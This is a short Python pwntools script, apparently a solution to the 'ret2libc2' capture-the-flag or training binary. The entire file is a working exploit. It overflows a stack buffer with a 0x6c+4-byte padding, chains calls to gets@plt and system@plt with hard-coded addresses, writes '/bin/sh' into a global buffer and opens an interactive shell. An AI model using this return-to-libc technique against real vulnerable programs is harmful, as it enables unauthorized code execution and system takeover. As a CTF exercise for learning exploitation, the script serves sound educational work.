from pwn import *



gets_plt = 0x08048460
system_plt = 0x08048490
buf2 = 0x804a080
offset = 0x6c + 4

payload = flat(
    [b'a' * offset, gets_plt, system_plt, buf2, buf2])
    
sh = process('./ret2libc2')
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()
